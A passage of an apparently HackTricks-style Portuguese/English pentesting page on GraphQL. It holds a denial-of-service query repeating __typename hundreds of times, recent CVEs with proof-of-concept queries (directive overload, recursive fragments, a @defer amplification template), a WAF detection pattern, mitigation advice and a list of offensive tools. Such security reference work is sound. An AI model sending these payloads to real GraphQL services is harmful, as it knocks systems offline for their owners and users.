\n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Vulnerabilidades Recentes (2023-2025)

> O ecossistema GraphQL evolui muito rapidamente; nos últimos dois anos várias vulnerabilidades críticas foram divulgadas nas bibliotecas de servidor mais usadas. Quando encontrar um endpoint GraphQL vale a pena fingerprinting do engine (veja **graphw00f**) e verificar a versão em execução em relação às vulnerabilidades abaixo.

### CVE-2024-47614 – `async-graphql` directive-overload DoS (Rust)
* Affected: async-graphql < **7.0.10** (Rust)
* Root cause: no limit on **diretivas duplicadas** (e.g. milhares de `@include`) que são expandidas em um número exponencial de nós de execução.
* Impact: uma única requisição HTTP pode esgotar CPU/RAM e travar o serviço.
* Fix/mitigation: upgrade ≥ 7.0.10 or call `SchemaBuilder.limit_directives()`; alternatively filter requests with a WAF rule such as `"@include.*@include.*@include"`.
```graphql
# PoC – repeat @include X times
query overload {
__typename @include(if:true) @include(if:true) @include(if:true)
}
```
### CVE-2024-40094 – `graphql-java` bypass de profundidade/complexidade do ENF
* Afetados: graphql-java < 19.11, 20.0-20.8, 21.0-21.4
* Causa raiz: **ExecutableNormalizedFields** não eram consideradas pela instrumentação `MaxQueryDepth` / `MaxQueryComplexity`. Fragmentos recursivos, portanto, contornavam todos os limites.
* Impacto: DoS não autenticado contra stacks Java que incorporam graphql-java (Spring Boot, Netflix DGS, produtos Atlassian…).
```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```
### CVE-2023-23684 – WPGraphQL SSRF to RCE chain
* Afetado: WPGraphQL ≤ 1.14.5 (WordPress plugin).
* Causa raiz: a mutação `createMediaItem` aceitava URLs controladas pelo atacante **`filePath`**, permitindo acesso à rede interna e gravação de arquivos.
* Impacto: Editores/Autores autenticados podiam alcançar endpoints de metadados ou gravar arquivos PHP para execução remota de código.

---

## Abuso de entrega incremental: `@defer` / `@stream`
Desde 2023 a maioria dos servidores principais (Apollo 4, GraphQL-Java 20+, HotChocolate 13) implementou as diretivas de **entrega incremental** definidas pelo GraphQL-over-HTTP WG. Cada patch adiado é enviado como um **chunk separado**, então o tamanho total da resposta se torna *N + 1* (envelope + patches). Uma query que contém milhares de pequenos campos adiados produz, portanto, uma resposta grande enquanto custa ao atacante apenas uma requisição — um clássico **amplification DoS** e uma forma de contornar regras WAF de tamanho do corpo que inspecionam apenas o primeiro chunk. Os próprios membros do WG sinalizaram o risco.

Exemplo de payload gerando 2 000 patches:
```graphql
query abuse {
% for i in range(0,2000):
f{{i}}: __typename @defer
% endfor
}
```
Mitigation: disable `@defer/@stream` in production or enforce `max_patches`, cumulative `max_bytes` and execution time. Libraries like **graphql-armor** (see below) already enforce sensible defaults.

---

## Defensive middleware (2024+)

| Project | Notes |
|---|---|
| **graphql-armor** | middleware de validação em Node/TypeScript publicado pela Escape Tech. Implementa limites plug-and-play para query depth, contagens de alias/field/directive, tokens e cost; compatível com Apollo Server, GraphQL Yoga/Envelop, Helix, etc. |

Início rápido:
```ts
import { protect } from '@escape.tech/graphql-armor';
import { applyMiddleware } from 'graphql-middleware';

const protectedSchema = applyMiddleware(schema, ...protect());
```
`graphql-armor` agora bloqueará consultas excessivamente profundas, complexas ou com muitas directives, protegendo contra os CVEs mencionados acima.

---


## Ferramentas

### Vulnerability scanners

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Test common misconfigurations of graphql endpoints
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): GraphQL security auditing script with a focus on performing batch GraphQL queries and mutations.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Fingerprint the graphql being used
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit that can be used to grab schemas and search for sensitive data, test authorization, brute force schemas, and find paths to a given type.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Can be used as standalone or [Burp extension](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Can be used as a CLI client also to automate attacks: `python3 graphqlmap.py -u http://example.com/graphql --inject`
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Tool that lists the different ways of **reaching a given type in a GraphQL schema**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): The Successor of Standalone and CLI Modes os InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp extension or python script for advanced GraphQL testing. The _**Scanner**_ is the core of InQL v5.0, where you can analyze a GraphQL endpoint or a local introspection schema file. It auto-generates all possible queries and mutations, organizing them into a structured view for your analysis. The _**Attacker**_ component lets you run batch GraphQL attacks, which can be useful for circumventing poorly implemented rate limits: `python3 inql.py -t http://example.com/graphql -o output.json`
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Try to get the schema even with introspection disabled by using the help of some Graphql databases that will suggest the names of mutations and parameters.

### Scripts to exploit common vulnerabilities

- [https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS](https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS): Collection of scripts for exploiting denial-of-service vulnerabilities in vulnerable graphql environments.

### Clients

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI client
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Client

### Automatic Tests


{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Vídeo explicando AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referências

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)
- [**https://github.com/advisories/GHSA-5gc2-7c65-8fq8**](https://github.com/advisories/GHSA-5gc2-7c65-8fq8)
- [**https://github.com/escape-tech/graphql-armor**](https://github.com/escape-tech/graphql-armor)
- [**https://blog.doyensec.com/2025/12/02/inql-v610.html**](https://blog.doyensec.com/2025/12/02/inql-v610.html)
- [**https://github.com/nicholasaleks/graphql-threat-matrix**](https://github.com/nicholasaleks/graphql-threat-matrix)

{{#include ../../banners/hacktricks-training.md}}
